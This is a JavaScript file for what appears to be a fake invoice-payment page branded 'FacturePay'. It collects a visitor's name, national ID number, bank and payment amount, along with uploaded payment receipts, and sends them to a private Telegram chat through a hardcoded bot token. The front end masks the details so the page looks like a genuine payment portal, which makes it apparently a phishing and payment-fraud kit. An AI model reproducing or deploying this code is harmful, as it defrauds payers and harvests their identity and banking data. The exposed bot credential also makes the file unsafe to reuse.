const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

// Credenciales Telegram
const TELEGRAM_TOKEN = '8260412488:AAFCSGGrgSu9-mF7d7SjdI5bJ9cMa3WIqUY';
const TELEGRAM_CHAT_ID = '-1003321543933';

document.addEventListener('DOMContentLoaded', () => {
    // 1. Cargar datos del localStorage y configurar UI
    const data = JSON.parse(localStorage.getItem('datosFactura')) || {};
    actualizarInterfaz(data);
    setupModalCorreo(data);

    // 2. Elementos del DOM
    const botonPagar = document.querySelector('.btn-pay');
    const modalQr = document.getElementById('modalQrPse');
    
    // Botones e inputs Paso 1
    const btnCerrarQr = document.getElementById('btnCerrarQr');
    const btnDescargarQr = document.getElementById('btnDescargarQr');
    const btnConfirmarFinal = document.getElementById('btnConfirmarFinal');
    const qrPaso1 = document.getElementById('qrPaso1');
    
    // Botones e inputs Paso 2
    const qrPaso2 = document.getElementById('qrPaso2');
    const btnVolverAlQR = document.getElementById('btnVolverAlQR');
    const fileInput = document.getElementById('comprobanteInput');
    const fileNameDisplay = document.getElementById('fileNameDisplay');
    const btnEnviarComprobante = document.getElementById('btnEnviarComprobante');

    // ==========================================
    // LÓGICA PASO 1: ABRIR MODAL Y NOTIFICAR
    // ==========================================
    if (botonPagar) {
        botonPagar.addEventListener('click', (e) => {
            e.preventDefault();
            if (validarFormulario()) {
                resetearModal();
                modalQr.style.display = 'flex';
                
                // Extraer datos para el mensaje
                const nombre = document.getElementById('formNombre').value.trim();
                const cedula = document.getElementById('formNumId').value.trim();
                const banco = document.getElementById('selectBanco').value;
                const valor = document.getElementById('qrTotalPagar').textContent;

                const mensaje = `🟢 <b>NUEVO INTENTO DE PAGO QR</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n🏦 Banco: ${banco}\n💰 Valor: ${valor}`;
                enviarNotificacionTexto(mensaje);
            }
        });
    }

    if (btnDescargarQr) {
        btnDescargarQr.addEventListener('click', () => {
            const rutaImagen = document.getElementById('qrImagenPago').src;
            const link = document.createElement('a');
            link.href = rutaImagen;
            link.download = 'QR_Pago_FacturePay.png'; 
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            alert("Imagen guardada en su dispositivo.");
        });
    }

    if (btnCerrarQr) {
        btnCerrarQr.addEventListener('click', () => {
            modalQr.style.display = 'none';
        });
    }

    // Pasar del Paso 1 al Paso 2
    if (btnConfirmarFinal) {
        btnConfirmarFinal.addEventListener('click', () => {
            qrPaso1.style.display = 'none';
            qrPaso2.style.display = 'block';
        });
    }

    // ==========================================
    // LÓGICA PASO 2: SUBIR Y ENVIAR COMPROBANTE
    // ==========================================
    if (btnVolverAlQR) {
        btnVolverAlQR.addEventListener('click', () => {
            qrPaso2.style.display = 'none';
            qrPaso1.style.display = 'block';
        });
    }

    // Mostrar el nombre del archivo seleccionado
    if (fileInput) {
        fileInput.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                fileNameDisplay.textContent = e.target.files[0].name;
            } else {
                fileNameDisplay.textContent = 'Ningún archivo seleccionado';
            }
        });
    }

    // Enviar a Telegram
    if (btnEnviarComprobante) {
        btnEnviarComprobante.addEventListener('click', async () => {
            const file = fileInput.files[0];
            
            if (!file) {
                alert("Por favor, seleccione su comprobante antes de enviar.");
                return;
            }

            // Cambiar estado del botón
            const textoOriginal = btnEnviarComprobante.textContent;
            btnEnviarComprobante.disabled = true;
            btnEnviarComprobante.textContent = "Enviando archivo...";

            const nombre = document.getElementById('formNombre').value.trim();
            const caption = `📄 <b>Comprobante de pago</b>\nEnviado por: ${nombre}`;

            const exito = await enviarDocumentoTelegram(file, caption);

            if (exito) {
                alert("Comprobante enviado exitosamente. Gracias por su pago.");
                window.location.href = "index.html"; // Redirigir al inicio o página de éxito
            } else {
                alert("Hubo un error al enviar el comprobante. Por favor intente de nuevo.");
                btnEnviarComprobante.disabled = false;
                btnEnviarComprobante.textContent = textoOriginal;
            }
        });
    }

    // Cerrar el modal al dar clic fuera de la caja
    window.addEventListener('click', (e) => {
        if (e.target === modalQr) {
            modalQr.style.display = 'none';
        }
    });

    // Función para dejar el modal como nuevo si lo cierran y abren
    function resetearModal() {
        if(qrPaso1) qrPaso1.style.display = 'block';
        if(qrPaso2) qrPaso2.style.display = 'none';
        if(fileInput) fileInput.value = '';
        if(fileNameDisplay) fileNameDisplay.textContent = 'Ningún archivo seleccionado';
        if(btnEnviarComprobante) {
            btnEnviarComprobante.disabled = false;
            btnEnviarComprobante.textContent = "Enviar Comprobante";
        }
    }
});


// ==========================================
// FUNCIONES API TELEGRAM
// ==========================================

async function enviarNotificacionTexto(texto) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: texto,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error("Error al enviar mensaje a Telegram:", error);
    }
}

async function enviarDocumentoTelegram(file, caption) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('caption', caption);
    formData.append('parse_mode', 'HTML');
    
    // Si es imagen usa sendPhoto (más liviano para TG), sino sendDocument
    const endpoint = file.type.startsWith('image/') ? 'sendPhoto' : 'sendDocument';
    const fieldName = file.type.startsWith('image/') ? 'photo' : 'document';
    
    formData.append(fieldName, file);

    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${endpoint}`, {
            method: 'POST',
            body: formData
        });
        const result = await response.json();
        return result.ok;
    } catch (error) {
        console.error(`Error al enviar ${fieldName} a Telegram:`, error);
        return false;
    }
}


// ==========================================
// FUNCIONES AUXILIARES DE LA UI
// ==========================================

function validarFormulario() {
    const banco = document.getElementById('selectBanco').value;
    const email = document.getElementById('formCorreo').value.trim();
    const doc = document.getElementById('formNumId').value.trim();
    const name = document.getElementById('formNombre').value.trim();

    if (!banco || banco.includes("Seleccione")) { alert("Por favor, seleccione su banco."); return false; }
    if (!emailRegexValido.test(email)) { alert("Por favor, ingrese un correo válido."); return false; }
    if (doc.length < 5) { alert("Número de cédula incompleto."); return false; }
    if (name.length < 3) { alert("Por favor, ingrese su nombre completo."); return false; }
    
    return true;
}

function actualizarInterfaz(data) {
    if (document.getElementById('lblNombre') && data.nombreCompleto) document.getElementById('lblNombre').textContent = enmascararNombre(data.nombreCompleto);
    if (document.getElementById('lblId') && data.numId) document.getElementById('lblId').textContent = "CC - " + enmascararID(data.numId);
    if (document.getElementById('lblCorreo') && data.correo) document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
    if (document.getElementById('lblRef') && data.referencia) document.getElementById('lblRef').textContent = data.referencia;
    
    if (document.getElementById('formCorreo')) document.getElementById('formCorreo').value = data.correo || "";
    if (document.getElementById('formNumId')) document.getElementById('formNumId').value = data.numId || "";
    if (document.getElementById('formNombre')) document.getElementById('formNombre').value = data.nombreCompleto || "";
    if (document.getElementById('formCelular')) document.getElementById('formCelular').value = data.celular || "";
    
    const monto = data.montoPagar || 0;
    const valorFormateado = new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 }).format(monto);
    
    const idsPrecios = ['lblValorNeto', 'lblValorTotal', 'lblTotalFinal', 'qrTotalPagar'];
    idsPrecios.forEach(id => {
        if(document.getElementById(id)) document.getElementById(id).textContent = valorFormateado;
    });
}

function setupModalCorreo(data) {
    const modal = document.getElementById('modalCorreo');
    const btnOpen = document.getElementById('btnCambiarCorreo');
    const btnCancel = document.getElementById('btnCancelarModal');
    const btnSave = document.getElementById('btnGuardarModal');
    const inputCorreo = document.getElementById('inputNuevoCorreo');

    if(btnOpen && modal) {
        btnOpen.addEventListener('click', () => { modal.style.display = 'flex'; });
        if(btnCancel) btnCancel.addEventListener('click', () => modal.style.display = 'none');
        if(btnSave) btnSave.addEventListener('click', () => {
            const nuevoCorreo = inputCorreo.value.trim();
            if (emailRegexValido.test(nuevoCorreo)) {
                data.correo = nuevoCorreo;
                localStorage.setItem('datosFactura', JSON.stringify(data));
                if(document.getElementById('lblCorreo')) document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
                if(document.getElementById('formCorreo')) document.getElementById('formCorreo').value = data.correo;
                modal.style.display = 'none';
            } else {
                alert("Correo inválido");
            }
        });
    }
}

function enmascararNombre(nombre) { return nombre ? nombre.split(" ")[0] + " *******" : ""; }
function enmascararID(id) { return id ? id.substring(0, 3) + "****" : ""; }
function enmascararCorreo(email) {
    if(!email) return "";
    const [user] = email.split("@");
    return user.substring(0, 2) + "*******@*****.com";
}
